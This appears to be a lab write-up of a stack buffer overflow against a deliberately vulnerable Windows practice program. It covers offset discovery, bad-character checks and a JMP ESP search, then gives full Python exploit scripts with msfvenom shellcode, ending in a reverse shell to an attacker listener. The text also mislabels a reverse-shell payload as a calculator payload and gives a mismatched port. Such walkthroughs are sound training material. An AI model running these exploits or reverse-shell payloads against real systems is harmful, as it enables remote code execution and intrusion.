---
permalink: /posts/Other/dostackbufferoverflowgood
title:  "dostackbufferoverflowgood"
author: Luc Kolen
description: "dostackbufferoveflowgood is a vulnerable Windows application made for practicing buffer overflow attacks"
categories:
tags:
  - Windows
  - Immunity debugger
  - Buffer overflow
---
# [dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)

- [dostackbufferoverflowgood](#dostackbufferoverflowgood)
  - [Find open port](#find-open-port)
  - [Connecting to the software](#connecting-to-the-software)
  - [Crashing the software](#crashing-the-software)
  - [Crashing with Immunity Debugger attached](#crashing-with-immunity-debugger-attached)
  - [Finding the offset](#finding-the-offset)
  - [Confirming the offset](#confirming-the-offset)
  - [Checking for bad characters](#checking-for-bad-characters)
  - [Find JMP ESP](#find-jmp-esp)
  - [Confirm JMP ESP](#confirm-jmp-esp)
  - [Exploit calculator](#exploit-calculator)
  - [Exploit reverse shell](#exploit-reverse-shell)

## Find open port

![Find open port](/assets/images/dostackbufferoverflowgood/1.a%20Find%20open%20port.png)

We can use [TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview) to view what software is listening on each port. In this case we see that `dostackbufferoverflowgood.exe` is listening on `31137`.

## Connecting to the software

```bash
luc@kali:~/dostackbufferoverflowgood$ python -c 'print "A" * 4' | nc 192.168.10.129 31337
Hello AAAA!!!
```

The Windows 10 machine running `dostackbufferoverflowgood.exe` is on IP address `192.168.10.129` so we can use `nc` from out Kali machine to connect to the application.

## Crashing the software

```bash
luc@kali:~/dostackbufferoverflowgood$ python -c 'print "A"*2000' | nc 192.168.10.129 31337
```

Sending a large payload of 2000 characters crashes the software.

## Crashing with Immunity Debugger attached

![Immunity debugger confirms EIP overwrite](/assets/images/dostackbufferoverflowgood/1.b%20Immunity%20debugger%20confirms%20EIP%20overwrite.png)

Sending the exact same payload with the application running in Immunity Debugger confirms that our payload was the cause of the crash. We can see that it tried to execute [41414141] (`0x41` is `A`) because that part of our payload ended up in EIP.

## Finding the offset

```bash
luc@kali:~/dostackbufferoverflowgood$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000 | nc 192.168.10.129 31337
```

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb` creates a long string which doesn't repeat so we can use that to find the offset.

![Immunity debugger finding the offset](/assets/images/dostackbufferoverflowgood/1.c%20Immunity%20debugger%20finding%20the%20offset.png)

```bash
luc@kali:~/dostackbufferoverflowgood$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 39654138
[*] Exact match at offset 146
```

We can see `39654138` in EIP and we can use `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb` to find the offset based on that.

```bash
!mona findmsp
...
[+] Examining registers
    EIP contains normal pattern : 0x39654138 (offset 146)
    ESP (0x009d19e4) points at offset 150 in normal pattern (length 1850)
    EBP contains normal pattern : 0x65413765 (offset 142)
...
```

We can also use [Mona](https://github.com/corelan/mona) to find the offsets by using `!mona findmsp` when the software crashes with our pattern in EIP. This also checks for our pattern in other registers and finds it in `EIP`, `ESP` and `EBP` in this case. `ESP` is important because with its length of 1850 it can be used for our payload.

## Confirming the offset

```bash
luc@kali:~/dostackbufferoverflowgood$ python -c 'print "A" * 146 + "B" * 4 + "C" * (2000-146-4)' | nc 192.168.10.129 31337
```

![Immunity debugger confirmed offset](/assets/images/dostackbufferoverflowgood/1.d%20Immunity%20debugger%20confirmed%20offset.png)

We can see that `EIP` is `42424242` which matches our input of `"B" * 4` and we can also see that `ESP` is filled with `C`

## Checking for bad characters

```python
#!/usr/bin/python2
import socket

try:
    print "\nSending evil buffer..."

    bufferSize = 2000
    offset = 146

    badchar_test = ""
    badchars = [0x00]

    for i in range(0x00, 0xFF+1):
        if i in badchars:
            continue
        badchar_test += chr(i)

    with open("badchar_test.bin", "wb") as f:
        f.write(badchar_test)

    buffer = ""
    buffer += "A" * (offset - len(buffer))
    buffer += "BBBB"
    buffer += badchar_test
    buffer += "C" * (bufferSize - len(buffer))
    buffer += "\n"

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.10.129", 31337))
    s.send(buffer)

    s.close

    print "\n Send buffer with size: " + str(len(buffer))

except:
    print "\n Could not connect"
```

We can use this python script to check for bad characters.

```bash
luc@kali:~/dostackbufferoverflowgood$ python2 bad.py
luc@kali:~/dostackbufferoverflowgood$ ls
badchar_test.bin  bad.py
luc@kali:~/dostackbufferoverflowgood$ python3 -m http.server
```

Running this software will create `badchar_test.bin` which contains all the characters that have been send over and should be in `ESP` now. We download this file on the Windows machine as `"C:\Users\User\Downloads\badchar_test.bin"`.

```bash
!mona cmp -a esp -f C:\Users\User\badchar_test.bin
```

![Mona compare ESP](/assets/images/dostackbufferoverflowgood/1.e%20Mona%20compare%20ESP.png)

We can see that `0x0a` is added to our list of BadChars, we'll add this to our python script.

```bash
luc@kali:~/dostackbufferoverflowgood$ nano bad.py
    badchars = [0x00,0x0a]
luc@kali:~/dostackbufferoverflowgood$ python2 bad.py
luc@kali:~/dostackbufferoverflowgood$ python3 -m http.server
```

This resulted in a new `badchar_test.bin` file because that file no longer contains `0x0a` so we'll delete the old one and download the new version.

```bash
!mona cmp -a esp -f C:\Users\User\badchar_test.bin
```

![Mona compares ESP success](/assets/images/dostackbufferoverflowgood/1.f%20Mona%20compares%20ESP%20success.png)

We now have the message in Mona that the status of `ESP` is unmodified. So we can continue with developing our exploit with `0x00` and `0x0a` as our bad characters.

## Find JMP ESP

We can overwrite `EIP` and we have space for our payload in `ESP` but this isn't enough for code execution yet. We need a `JMP ESP` or `CALL ESP` so our payload in `ESP` is executed instead of the application crashing.

```bash
!mona jmp -r esp -cpb "\x00\x0a"
 Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0-(C:\Users\User\Documents\dostackbufferoverflowgood\dostackbufferoverflowgood.exe)
 Message=  0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0-(C:\Users\User\Documents\dostackbufferoverflowgood\dostackbufferoverflowgood.exe)
```

We get two results `0x080414c3` and `0x080416bf`, both can be used and because of our filter `-cpb "\x00\x0a"` they won't contain any bad characters.

## Confirm JMP ESP

```bash
python2 -c 'import struct; jmp_esp = 0x080414c3; buf = "A" * 146; buf += struct.pack("<I", jmp_esp); buf += "\xCC" * (2000-len(buf)); print buf;' | nc 192.168.10.129 31337
```

![Immunity debugger breakpoint](/assets/images/dostackbufferoverflowgood/1.g%20Immunity%20debugger%20breakpoint.png)

`\xCC` is interpreted by Immunity Debugger as a breakpoint so hitting those confirms that our JMP ESP is executed and that we're executing our payload in `ESP`.

## Exploit calculator

```bash
luc@kali:~/dostackbufferoverflowgood$ msfvenom -p windows/shell_reverse_tcp -b '\x00\x0a' -f python --var-name shellcode EXITFUNC=thread LHOST=192.168.10.21 LPORT=443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
...
shellcode =  b""
shellcode += b"\xdd\xc5\xba\x64\xc9\xbf\xf9\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04"
...
shellcode += b"\xde\x18\xa7\x24\x5d\xa8\x58\xd3\x7d\xd9\x5d"
shellcode += b"\x9f\x39\x32\x2c\xb0\xaf\x34\x83\xb1\xe5"
```

```python
#!/usr/bin/python2
import socket
import struct

try:
    print "\nSending evil buffer..."

    bufferSize = 2000
    offset = 146

    jmp_esp = 0x080414c3

    shellcode =  b""
    shellcode += b"\xdb\xca\xd9\x74\x24\xf4\xbb\x7e\x9d\x36\xab"
    shellcode += b"\x58\x29\xc9\xb1\x31\x31\x58\x18\x83\xc0\x04"
    shellcode += b"\x03\x58\x6a\x7f\xc3\x57\x7a\xfd\x2c\xa8\x7a"
    shellcode += b"\x62\xa4\x4d\x4b\xa2\xd2\x06\xfb\x12\x90\x4b"
    shellcode += b"\xf7\xd9\xf4\x7f\x8c\xac\xd0\x70\x25\x1a\x07"
    shellcode += b"\xbe\xb6\x37\x7b\xa1\x34\x4a\xa8\x01\x05\x85"
    shellcode += b"\xbd\x40\x42\xf8\x4c\x10\x1b\x76\xe2\x85\x28"
    shellcode += b"\xc2\x3f\x2d\x62\xc2\x47\xd2\x32\xe5\x66\x45"
    shellcode += b"\x49\xbc\xa8\x67\x9e\xb4\xe0\x7f\xc3\xf1\xbb"
    shellcode += b"\xf4\x37\x8d\x3d\xdd\x06\x6e\x91\x20\xa7\x9d"
    shellcode += b"\xeb\x65\x0f\x7e\x9e\x9f\x6c\x03\x99\x5b\x0f"
    shellcode += b"\xdf\x2c\x78\xb7\x94\x97\xa4\x46\x78\x41\x2e"
    shellcode += b"\x44\x35\x05\x68\x48\xc8\xca\x02\x74\x41\xed"
    shellcode += b"\xc4\xfd\x11\xca\xc0\xa6\xc2\x73\x50\x02\xa4"
    shellcode += b"\x8c\x82\xed\x19\x29\xc8\x03\x4d\x40\x93\x49"
    shellcode += b"\x90\xd6\xa9\x3f\x92\xe8\xb1\x6f\xfb\xd9\x3a"
    shellcode += b"\xe0\x7c\xe6\xe8\x45\x62\x04\x39\xb3\x0b\x91"
    shellcode += b"\xa8\x7e\x56\x22\x07\xbc\x6f\xa1\xa2\x3c\x94"
    shellcode += b"\xb9\xc6\x39\xd0\x7d\x3a\x33\x49\xe8\x3c\xe0"
    shellcode += b"\x6a\x39\x5f\x67\xf9\xa1\x8e\x02\x79\x43\xcf"

    buffer = ""
    buffer += "A" * (offset - len(buffer))
    buffer += struct.pack("<I", jmp_esp)
    buffer += "\x90" * 12
    buffer += shellcode
    buffer += "\x90" * (bufferSize - len(buffer))
    buffer += "\n"

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.10.129", 31337))
    s.send(buffer)

    s.close

    print "\n Send buffer with size: " + str(len(buffer))

except:
    print "\n Could not connect"
```

```bash
luc@kali:~/dostackbufferoverflowgood$ python2 calc.py
```

Running `calc.py` opens the calculator on our Windows machine. We've confirmed that we can run `msfvenom` payloads via our buffer overflow.

## Exploit reverse shell

```bash
luc@kali:~/dostackbufferoverflowgood$ msfvenom -p windows/shell_reverse_tcp -b '\x00\x0a' -f python --var-name shellcode EXITFUNC=thread LHOST=192.168.10.21 LPORT=443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
...
shellcode =  b""
shellcode += b"\xdd\xc5\xba\x64\xc9\xbf\xf9\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04"
...
shellcode += b"\xde\x18\xa7\x24\x5d\xa8\x58\xd3\x7d\xd9\x5d"
shellcode += b"\x9f\x39\x32\x2c\xb0\xaf\x34\x83\xb1\xe5"
```

```python
#!/usr/bin/python2
import socket
import struct

try:
    print "\nSending evil buffer..."

    bufferSize = 2000
    offset = 146

    jmp_esp = 0x080414c3

    shellcode =  b""
    shellcode += b"\xdd\xc5\xba\x64\xc9\xbf\xf9\xd9\x74\x24\xf4"
    shellcode += b"\x58\x31\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04"
    shellcode += b"\x03\x34\xda\x5d\x0c\x48\x34\x23\xef\xb0\xc5"
    shellcode += b"\x44\x79\x55\xf4\x44\x1d\x1e\xa7\x74\x55\x72"
    shellcode += b"\x44\xfe\x3b\x66\xdf\x72\x94\x89\x68\x38\xc2"
    shellcode += b"\xa4\x69\x11\x36\xa7\xe9\x68\x6b\x07\xd3\xa2"
    shellcode += b"\x7e\x46\x14\xde\x73\x1a\xcd\x94\x26\x8a\x7a"
    shellcode += b"\xe0\xfa\x21\x30\xe4\x7a\xd6\x81\x07\xaa\x49"
    shellcode += b"\x99\x51\x6c\x68\x4e\xea\x25\x72\x93\xd7\xfc"
    shellcode += b"\x09\x67\xa3\xfe\xdb\xb9\x4c\xac\x22\x76\xbf"
    shellcode += b"\xac\x63\xb1\x20\xdb\x9d\xc1\xdd\xdc\x5a\xbb"
    shellcode += b"\x39\x68\x78\x1b\xc9\xca\xa4\x9d\x1e\x8c\x2f"
    shellcode += b"\x91\xeb\xda\x77\xb6\xea\x0f\x0c\xc2\x67\xae"
    shellcode += b"\xc2\x42\x33\x95\xc6\x0f\xe7\xb4\x5f\xea\x46"
    shellcode += b"\xc8\xbf\x55\x36\x6c\xb4\x78\x23\x1d\x97\x14"
    shellcode += b"\x80\x2c\x27\xe5\x8e\x27\x54\xd7\x11\x9c\xf2"
    shellcode += b"\x5b\xd9\x3a\x05\x9b\xf0\xfb\x99\x62\xfb\xfb"
    shellcode += b"\xb0\xa0\xaf\xab\xaa\x01\xd0\x27\x2a\xad\x05"
    shellcode += b"\xe7\x7a\x01\xf6\x48\x2a\xe1\xa6\x20\x20\xee"
    shellcode += b"\x99\x51\x4b\x24\xb2\xf8\xb6\xaf\x7d\x54\xb2"
    shellcode += b"\x3a\x16\xa7\xc2\x45\x5d\x2e\x24\x2f\xb1\x67"
    shellcode += b"\xff\xd8\x28\x22\x8b\x79\xb4\xf8\xf6\xba\x3e"
    shellcode += b"\x0f\x07\x74\xb7\x7a\x1b\xe1\x37\x31\x41\xa4"
    shellcode += b"\x48\xef\xed\x2a\xda\x74\xed\x25\xc7\x22\xba"
    shellcode += b"\x62\x39\x3b\x2e\x9f\x60\x95\x4c\x62\xf4\xde"
    shellcode += b"\xd4\xb9\xc5\xe1\xd5\x4c\x71\xc6\xc5\x88\x7a"
    shellcode += b"\x42\xb1\x44\x2d\x1c\x6f\x23\x87\xee\xd9\xfd"
    shellcode += b"\x74\xb9\x8d\x78\xb7\x7a\xcb\x84\x92\x0c\x33"
    shellcode += b"\x34\x4b\x49\x4c\xf9\x1b\x5d\x35\xe7\xbb\xa2"
    shellcode += b"\xec\xa3\xdc\x40\x24\xde\x74\xdd\xad\x63\x19"
    shellcode += b"\xde\x18\xa7\x24\x5d\xa8\x58\xd3\x7d\xd9\x5d"
    shellcode += b"\x9f\x39\x32\x2c\xb0\xaf\x34\x83\xb1\xe5"

    buffer = ""
    buffer += "A" * (offset - len(buffer))
    buffer += struct.pack("<I", jmp_esp)
    buffer += "\x90" * 20
    buffer += shellcode
    buffer += "\x90" * (bufferSize - len(buffer))
    buffer += "\n"

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.10.129", 31337))
    s.send(buffer)

    s.close  

    print "\n Send buffer with size: " + str(len(buffer))

except:
    print "\n Could not connect"
```

```bash
luc@kali:~/dostackbufferoverflowgood$ python2 shell.py
```

```bash
luc@kali:~/dostackbufferoverflowgood$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.10.129.
Ncat: Connection from 192.168.10.129:50233.
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\User\Documents\dostackbufferoverflowgood>whoami
windev2004eval\user

C:\Users\User\Documents\dostackbufferoverflowgood>hostname
WinDev2004Eval
```

We successfully opened a reverse shell via our buffer overflow.
